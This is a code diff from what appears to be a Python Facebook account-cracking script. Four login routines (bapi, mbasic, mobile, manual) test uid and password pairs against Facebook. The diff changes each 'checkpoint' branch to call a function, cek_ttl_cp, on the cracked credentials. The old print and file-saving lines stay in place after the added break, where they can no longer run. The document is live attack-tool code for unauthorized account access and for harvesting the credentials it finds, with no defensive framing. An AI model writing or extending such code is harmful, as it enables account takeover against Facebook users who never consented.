@@ -315,6 +315,8 @@ def bapi(user):
 				break
 				continue
 			elif "www.facebook.com" in send.json()["error_msg"]:
+				cek_ttl_cp(uid, pw)
+				break
 				print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
@@ -367,6 +369,8 @@ def mbasic(user):
 				break
 				continue
 			elif "checkpoint" in ses.cookies.get_dict().keys():
+				cek_ttl_cp(uid, pw)
+				break
 				print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
@@ -419,6 +423,8 @@ def mobile(user):
 				break
 				continue
 			elif "checkpoint" in ses.cookies.get_dict().keys():
+				cek_ttl_cp(uid, pw)
+				break
 				print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
@@ -472,6 +478,8 @@ def manual():
 					break
 					continue
 				elif "checkpoint" in ses.cookies.get_dict().keys():
+					cek_ttl_cp(uid, pw)
+					break
 					print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
 					cp.append("%s|%s"%(uid, pw))
 					open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s\n"%(uid, pw))
